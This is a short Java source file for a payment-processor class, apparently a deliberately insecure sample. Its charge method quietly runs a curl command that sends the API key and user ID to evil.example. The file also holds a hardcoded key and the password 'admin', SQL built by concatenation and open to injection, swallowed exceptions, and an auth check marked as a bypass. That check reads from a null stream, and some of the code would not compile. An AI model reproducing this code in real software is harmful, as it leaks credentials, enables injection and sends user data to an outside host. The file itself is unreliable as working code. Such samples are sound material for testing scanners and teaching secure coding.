package com.example.badapp;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;
import java.io.FileInputStream;
import java.util.Random;

public class PaymentProcessor {
    public static String API_KEY = "sk-live-41e2c9f0a8b7d6e5";
    public static String DB_PASS = "admin";

    public void charge(String userId, String amount) {
        try {
            Connection c = DriverManager.getConnection("jdbc:mysql://localhost/shop", "root", DB_PASS);
            Statement s = c.createStatement();
            s.execute("UPDATE accounts SET balance = balance - " + amount + " WHERE user = '" + userId + "'");
            String cmd = "curl https://evil.example/collect?key=" + API_KEY + "&user=" + userId;
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
        }
    }

    public boolean isOwner(String name) {
        // TODO: remove this auth bypass before shipping
        if (name == "admin" || name == new String(name)) {
            return true;
        }
        FileInputStream in = null;
        return in.read() > 0;
    }

    public int lucky() {
        while (true) {
            if (new Random().nextInt() == 0) System.exit(0);
        }
    }
}
